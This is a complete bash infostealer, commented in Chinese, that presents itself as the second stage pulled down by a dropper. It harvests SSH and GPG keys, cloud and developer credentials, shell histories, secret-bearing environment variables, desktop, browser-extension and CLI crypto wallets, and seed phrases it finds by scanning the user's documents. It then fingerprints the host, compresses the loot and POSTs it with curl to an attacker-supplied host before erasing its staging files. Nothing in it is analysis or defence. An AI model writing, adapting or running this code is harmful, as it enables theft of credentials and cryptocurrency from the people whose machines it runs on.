#!/bin/bash
# ==============================================================================
#  stage2 采集器 —— 由 stage1 dropper 从服务器拉取并执行
#
#  设计要点：
#    - 输出重定向到 /tmp/hv.log，卡在哪一眼能看到
#    - 每个阶段打 trace
#    - 助记词扫描用 grep 预筛，不用 bash 逐行循环（否则会卡死）
#    - 最后打 tar.gz，POST 回接收端
# ==============================================================================

EXFIL="${EXFIL:-__EXFIL__}"
TAG="${TAG:-$(hostname 2>/dev/null | tr -cd 'A-Za-z0-9._-')}"
STAGE="/tmp/.$TAG.$$"
LOG="/tmp/hv.log"
MAX_ITEM=2097152
H="$HOME"

t() { echo "[$(date +%H:%M:%S)] $*" >>"$LOG" 2>/dev/null; }

t "=== harvester start tag=$TAG exfil=$EXFIL home=$H ==="
mkdir -p "$STAGE" 2>/dev/null || { t "stage mkdir failed"; exit 0; }
cd "$STAGE" 2>/dev/null || { t "cd failed"; exit 0; }

# ------------------------------------------------------------------ 工具函数
grab() {
    local src="$1" dst="$2"
    [ -e "$src" ] || return 0
    [ -r "$src" ] || return 0
    mkdir -p "$(dirname "$dst")" 2>/dev/null
    if [ -d "$src" ]; then
        find "$src" -type f -size -${MAX_ITEM}c 2>/dev/null | while read -r f; do
            rel="${f#$src/}"
            mkdir -p "$(dirname "$dst/$rel")" 2>/dev/null
            cp -p "$f" "$dst/$rel" 2>/dev/null
        done
    else
        sz=$(wc -c <"$src" 2>/dev/null || echo 0)
        [ "$sz" -le "$MAX_ITEM" ] && cp -p "$src" "$dst" 2>/dev/null
    fi
}

sample() {
    local src="$1" dst="$2" linecnt="${3:-2000}"
    [ -r "$src" ] || return 0
    mkdir -p "$(dirname "$dst")" 2>/dev/null
    tail -n "$linecnt" "$src" >"$dst" 2>/dev/null
}

# ============================================================ 一、SSH 与密钥
t "section 1: ssh/keys"
grab "$H/.ssh"                                   "ssh"
grab "$H/.gnupg"                                 "gnupg"
find "$H" -maxdepth 3 -type f \( -name "*.pem" -o -name "*.key" -o -name "*.p12" \
     -o -name "*.pfx" -o -name "*.jks" \) -size -${MAX_ITEM}c 2>/dev/null | while read -r f; do
    grab "$f" "keys/$(basename "$f")"
done

# ============================================================ 二、云凭证
t "section 2: cloud"
grab "$H/.aws"                                   "cloud/aws"
grab "$H/.config/gcloud"                         "cloud/gcloud"
grab "$H/.azure"                                 "cloud/azure"
grab "$H/.aliyun"                                "cloud/aliyun"
grab "$H/.config/rclone"                         "cloud/rclone"
grab "$H/.config/doctl"                          "cloud/doctl"
grab "$H/.hcloud"                                "cloud/hcloud"
grab "$H/.config/heroku"                         "cloud/heroku"
grab "$H/.netrc"                                 "cloud/netrc"

# ============================================================ 三、代码托管与 CI
t "section 3: dev"
grab "$H/.gitconfig"                             "dev/gitconfig"
grab "$H/.git-credentials"                       "dev/git-credentials"
grab "$H/.npmrc"                                 "dev/npmrc"
grab "$H/.yarnrc"                                "dev/yarnrc"
grab "$H/.pypirc"                                "dev/pypirc"
grab "$H/.gem/credentials"                       "dev/gem-credentials"
grab "$H/.cargo/credentials.toml"                "dev/cargo-credentials"
grab "$H/.docker/config.json"                    "dev/docker-config.json"
grab "$H/.kube/config"                           "dev/kube-config"
grab "$H/.config/gh/hosts.yml"                   "dev/gh-hosts.yml"
grab "$H/.config/vercel"                         "dev/vercel"
grab "$H/.config/netlify"                        "dev/netlify"
grab "$H/.config/stripe"                         "dev/stripe"
grab "$H/.terraformrc"                           "dev/terraformrc"
grab "$H/.config/terraform"                      "dev/terraform-d"

# ============================================================ 四、Shell 历史
t "section 4: history"
sample "$H/.zsh_history"        "history/zsh_history" 4000
sample "$H/.bash_history"       "history/bash_history" 4000
sample "$H/.sh_history"         "history/sh_history" 2000
sample "$H/.python_history"     "history/python_history" 1000
sample "$H/.psql_history"       "history/psql_history" 1000
sample "$H/.mysql_history"      "history/mysql_history" 1000

# ============================================================ 五、环境变量
t "section 5: env"
env 2>/dev/null | grep -iE "key|token|secret|pass|cred|auth|api|wallet|mnemonic|seed|priv" \
    >"env-filtered.txt" 2>/dev/null

# ============================================================ 六、★ 加密钱包
t "section 6: wallets"
W="$H/Library/Application Support"

grab "$W/Exodus"                                "wallets/exodus"
grab "$W/exodus"                                "wallets/exodus-lc"
grab "$W/Electrum"                              "wallets/electrum-appsupport"
grab "$H/.electrum"                             "wallets/electrum-home"
grab "$W/Coinomi"                               "wallets/coinomi"
grab "$W/atomic"                                "wallets/atomic"
grab "$W/Atomic"                                "wallets/atomic-lc"
grab "$W/Bitcoin"                               "wallets/bitcoin-core"
grab "$W/Ethereum"                              "wallets/ethereum-geth"
grab "$H/.ethereum"                             "wallets/ethereum-home"
grab "$W/Ledger Live"                           "wallets/ledger-live"
grab "$W/Trezor Suite"                          "wallets/trezor-suite"
grab "$W/Wasabi Wallet"                         "wallets/wasabi"
grab "$H/.bitcoin"                              "wallets/bitcoin-home"
grab "$H/.litecoin"                             "wallets/litecoin"
grab "$H/.dogecoin"                             "wallets/dogecoin"
grab "$H/.monero"                               "wallets/monero"

t "section 6b: browser wallets"
for BR in "Google/Chrome" "BraveSoftware/Brave-Browser" "Microsoft Edge" "Chromium" "Vivaldi"; do
    for PROF in Default "Profile 1" "Profile 2" "Profile 3"; do
        for EXT in nkbihfbeogaeaoehlefnkodbefgpgknn \
                   egjidjbpglichdcondbcbdnbeeppgdph \
                   bfnaelmomeimhlpmgjnjophhpkkoljpa \
                   acmacodkjbdgmoleebolmdjonilkdbch \
                   fhbohimaelbohpjbbldcngcnapndodjp \
                   hnifbagmdatjbhpeidckjbkgbndmodjh \
                   dmkamcknogkgcdfhhbddcghachkejeap; do
            grab "$W/$BR/$PROF/Local Extension Settings/$EXT" "wallets/ext/$BR/$PROF/$EXT"
        done
    done
done

t "section 6c: cli wallets"
grab "$W/Phantom"                               "wallets/phantom"
grab "$W/Solflare"                              "wallets/solflare"
grab "$W/Backpack"                              "wallets/backpack"
grab "$H/.config/solana"                        "wallets/solana-cli"
grab "$H/.near-credentials"                     "wallets/near"
grab "$H/.terra"                                "wallets/terra"
grab "$H/.osmosisd"                             "wallets/osmosis"
grab "$H/.injectived"                           "wallets/injective"
grab "$H/.axelard"                              "wallets/axelar"
grab "$H/.gaia"                                 "wallets/cosmos"
grab "$H/.sei"                                  "wallets/sei"
grab "$H/.sui"                                  "wallets/sui"
grab "$H/.aptos"                                "wallets/aptos"

t "section 6d: loose wallet files"
i=0
find "$H" -maxdepth 4 -type f \
     \( -name "keystore*.json" -o -path "*/keystore/UTC--*" \
        -o -name "wallet.dat" -o -name "*.wallet" -o -name "seed.seco" \
        -o -name "wallet-encrypted.json" -o -name "*.keystore" \) \
     -size -${MAX_ITEM}c 2>/dev/null | head -60 | while read -r f; do
    i=$((i+1))
    grab "$f" "wallets/found/$i-$(basename "$f")"
done

# ============================================================ 七、★ 助记词扫描
# 用 grep 正则先筛（快），再对少量候选做词表打分
t "section 7: mnemonic scan"
PAT12='^([a-z]{3,8} ){11}[a-z]{3,8}$'
PAT24='^([a-z]{3,8} ){23}[a-z]{3,8}$'
PAT15='^([a-z]{3,8} ){14}[a-z]{3,8}$'
PAT18='^([a-z]{3,8} ){17}[a-z]{3,8}$'
PATALL="$PAT12|$PAT24|$PAT15|$PAT18"

CAND="$STAGE/.cand"
: >"$CAND" 2>/dev/null
for D in "$H/Documents" "$H/Desktop" "$H/Downloads" "$H/Notes" "$H/Dropbox" "$H/Documentos"; do
    [ -d "$D" ] || continue
    t "  scan $D"
    find "$D" -type f -size -1M \
         \( -name "*.txt" -o -name "*.md" -o -name "*.rtf" -o -name "*.csv" \
            -o -name "*.json" -o -name "*.log" -o -name "*.bak" -o -name "*.old" \
            -o -name "*.text" -o -name "*.dat" \) 2>/dev/null | head -150 | while read -r f; do
        if grep -qE "$PATALL" "$f" 2>/dev/null; then
            echo "=== $f ===" >>"$CAND"
            grep -hE "$PATALL" "$f" 2>/dev/null | head -5 >>"$CAND"
        fi
    done
done

for HF in "$H/.zsh_history" "$H/.bash_history"; do
    [ -r "$HF" ] || continue
    if grep -qE "$PAT12|$PAT24" "$HF" 2>/dev/null; then
        echo "=== $HF ===" >>"$CAND"
        grep -hE "$PAT12|$PAT24" "$HF" 2>/dev/null | head -10 >>"$CAND"
    fi
done

t "  scoring candidates ($(wc -l <"$CAND" 2>/dev/null || echo 0) lines)"
SAMPLE_WORDS=" abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual adapt add addict address adjust admit adult advance advice aerobic affair afford afraid again age agent agree ahead aim air airport aisle alarm album alcohol alert alien all alley allow almost alone alpha already also alter always amateur amazing among amount amused analyst anchor ancient anger angle angry animal ankle announce annual another answer antenna antique anxiety any apart apology appear apple approve april arch arctic area arena argue arm armed armor army around arrange arrest arrive arrow art artefact artist artwork ask aspect assault asset assist assume asthma athlete atom attack attend attitude attract auction audit august aunt author auto autumn average avocado avoid awake aware away awesome awful awkward axis"
: >"mnemonics.txt" 2>/dev/null
if [ -s "$CAND" ]; then
    while IFS= read -r line; do
        case "$line" in
            "==="*) echo "$line" >>"mnemonics.txt"; continue ;;
        esac
        total=0; hit=0
        for w in $line; do
            total=$((total+1))
            case " $SAMPLE_WORDS " in *" $w "*) hit=$((hit+1)) ;; esac
        done
        if [ "$total" -ge 12 ] && [ "$hit" -ge $((total/2)) ]; then
            echo "$line" >>"mnemonics.txt"
        fi
    done <"$CAND"
fi
rm -f "$CAND" 2>/dev/null
t "  mnemonic scan done"

# ============================================================ 八、系统指纹
t "section 8: fingerprint"
{
    echo "hostname: $(hostname 2>/dev/null)"
    echo "user:     $(whoami 2>/dev/null)"
    echo "uid:      $(id -u 2>/dev/null)"
    echo "home:     $H"
    echo "os:       $(sw_vers 2>/dev/null | tr '\n' ' ')"
    echo "arch:     $(uname -m 2>/dev/null)"
    echo "date:     $(date 2>/dev/null)"
    echo "shell:    $SHELL"
    echo "sshkeys:  $(ls -1 "$H/.ssh" 2>/dev/null | tr '\n' ' ')"
    echo "apps:     $(ls -1 "$W" 2>/dev/null | grep -iE 'exodus|electrum|phantom|solflare|atomic|coinomi|bitcoin|ethereum|ledger|trezor|wasabi' | tr '\n' ' ')"
} >"fingerprint.txt" 2>/dev/null

which solana anchor cast forge near 2>/dev/null >"cli-tools.txt"

# ============================================================ 九、打包外发
t "section 9: packaging"
cd "$STAGE" 2>/dev/null || exit 0
TOTAL=$(du -sk . 2>/dev/null | awk '{print $1}')
t "  staging size: ${TOTAL:-0} KB"

if [ "${TOTAL:-0}" -gt 51200 ]; then
    t "  too big, trimming"
    rm -rf wallets/ext 2>/dev/null
    find . -type f -size +512k -delete 2>/dev/null
fi

cp "$LOG" ./harvest.log 2>/dev/null

t "section 10: exfil to http://$EXFIL/u/$TAG"
tar czf - . 2>/dev/null | curl -s --max-time 90 \
      -X POST --data-binary @- \
      -H "X-Tag: $TAG" \
      "http://$EXFIL/u/$TAG"
RC=$?
t "exfil curl rc=$RC"

cd / 2>/dev/null
rm -rf "$STAGE" 2>/dev/null
t "=== harvester done ==="
exit 0
